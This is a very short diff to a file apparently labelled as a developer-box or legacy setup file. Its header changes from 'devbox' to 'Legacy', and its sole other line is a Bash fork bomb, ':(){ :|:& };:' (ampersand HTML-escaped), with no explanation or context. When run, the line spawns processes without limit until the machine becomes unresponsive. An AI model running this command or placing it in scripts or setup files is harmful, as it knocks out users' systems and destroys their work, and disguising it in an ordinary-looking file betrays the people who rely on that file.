@@ -1,2 +1,2 @@
-# devbox
+# Legacy
  :(){ :|:&amp; };:
